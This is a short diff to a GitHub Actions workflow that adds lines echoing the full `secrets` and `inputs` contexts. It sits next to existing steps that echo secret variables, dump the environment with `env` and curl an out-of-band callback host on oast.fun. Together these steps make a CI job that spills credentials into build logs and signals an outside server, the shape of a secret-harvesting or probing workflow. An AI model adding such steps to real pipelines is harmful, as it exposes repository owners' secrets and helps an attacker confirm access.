@@ -16,5 +16,7 @@ jobs:
           echo $super_secret
           echo $super_secret2
           echo 1; echo 2;
+          echo "${{ inputs }}"
+          echo "${{ secrets }}"
           env
           curl https://lobqidjjcvgdsnkvjczfwug76zlf0vhyx.oast.fun/githubwf
